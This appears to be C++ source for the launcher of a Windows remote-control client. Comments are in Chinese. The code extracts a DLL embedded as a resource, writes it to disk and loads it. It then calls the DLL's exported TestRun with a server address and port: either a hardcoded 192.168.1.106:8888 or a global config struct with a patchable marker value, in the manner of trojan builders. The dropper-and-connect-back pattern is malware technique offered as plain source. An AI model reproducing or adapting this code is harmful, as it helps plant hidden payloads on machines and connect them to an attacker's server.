#include <iostream>
#include <Windows.h>
#include "resource.h"
using namespace std;

typedef
void (*pfnTestRun)(char* szServerIP,unsigned short  uPort); 

struct CONNECT_ADDRESS
{
	DWORD dwFlag;
	char  szServerIP[MAX_PATH];
	int   iPort;
}g_ConnectAddress={0x1234567,"",0};

VOID Sub_1();
VOID Start_1(char* szDllFullPath);
BOOL CreateExeFilePre(char* szFileFullPath,int iResourceID,char* szResourceName);
BOOL CreateExeFilePost(char* szFileFullPath,LPBYTE szBuffer,DWORD dwBufferSize);

VOID Sub_2();

VOID Start_2(char* szDllFullPath);


void main()
{
  
	Sub_2();

	//Sub_1();
}


VOID Sub_2()
{
	char szDllFullPath[MAX_PATH] = "ClientDll.dll";	
	Start_2(szDllFullPath);
} 



VOID Start_2(char* szDllFullPath)
{
	HMODULE hDll = LoadLibrary(szDllFullPath);  

	char szServerIP[]="192.168.1.106";          
	unsigned short  uPort = 8888;  
	if (hDll!=NULL)
	{
		//获得Dll中一个函数地址  然后调用
		
		pfnTestRun  TestRunAddress = (pfnTestRun)GetProcAddress(hDll,"TestRun");
		
		if (TestRunAddress!=NULL)
		{
			TestRunAddress(szServerIP,uPort);	
		}
		
	}
	
	printf("Input AnyKey To Exit\r\n");
	
	getchar();
	getchar();
	if (hDll!=NULL)
	{
		FreeLibrary(hDll);
		
		hDll = NULL;
	}

}




VOID Sub_1()
{
	char szDllFullPath[MAX_PATH] = "ClientDll.dll";
	CreateExeFilePre(szDllFullPath,IDR_DLL,"DLL");
	
	Sleep(2000);
	
	Start_1(szDllFullPath);
}
 

VOID Start_1(char* szDllFullPath)
{
	HMODULE hDll = LoadLibrary(szDllFullPath);  
	if (hDll!=NULL)
	{
		//获得Dll中一个函数地址  然后调用
		
		pfnTestRun  TestRunAddress = (pfnTestRun)GetProcAddress(hDll,"TestRun");
		
		if (TestRunAddress!=NULL)
		{
			//TestRunAddress(szServerIP,uPort);
			
			TestRunAddress(g_ConnectAddress.szServerIP,g_ConnectAddress.iPort);
		}
		
	}
	
	printf("Input AnyKey To Exit\r\n");
	
	getchar();
	getchar();
	if (hDll!=NULL)
	{
		FreeLibrary(hDll);
		
		hDll = NULL;
	}

}



//要释放的路径   资源ID            资源名
BOOL CreateExeFilePre(char* szFileFullPath,int iResourceID,char* szResourceName)
{
	HRSRC hRescInfor;
	HGLOBAL hRescData;
	DWORD dwRescSize;
	LPBYTE szBuffer;
	// 查找所需的资源
	hRescInfor = FindResource(NULL, MAKEINTRESOURCE(iResourceID), szResourceName);
	if (hRescInfor == NULL)
	{
		//MessageBox(NULL, "查找资源失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return FALSE;
	}
	// 获得资源尺寸
	dwRescSize = SizeofResource(NULL, hRescInfor);
	// 装载资源
	hRescData = LoadResource(NULL, hRescInfor);
	if (hRescData == NULL)
	{
		//MessageBox(NULL, "装载资源失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return FALSE;
	}
	// 为数据分配空间
	szBuffer = (LPBYTE)GlobalAlloc(GPTR, dwRescSize);
	if (szBuffer == NULL)
	{
		//MessageBox(NULL, "分配内存失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return FALSE;
	}
	// 复制资源数据
	CopyMemory((LPVOID)szBuffer, (LPCVOID)LockResource(hRescData), dwRescSize);	
	
	BOOL bOk = CreateExeFilePost(szFileFullPath,szBuffer,dwRescSize);
	if(!bOk)
	{
		GlobalFree((HGLOBAL)szBuffer);
		return FALSE;
	}
	
	GlobalFree((HGLOBAL)szBuffer);
	
	return TRUE;
}



BOOL CreateExeFilePost(char* szFileFullPath,LPBYTE szBuffer,DWORD dwBufferSize)
{
	DWORD dwReturn = 0;
	
	HANDLE hFile = CreateFile(szFileFullPath, GENERIC_WRITE, 0, 
		NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
	{
		WriteFile(hFile, (LPCVOID)szBuffer, dwBufferSize, &dwReturn, NULL);
	}
	else
	{
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}
          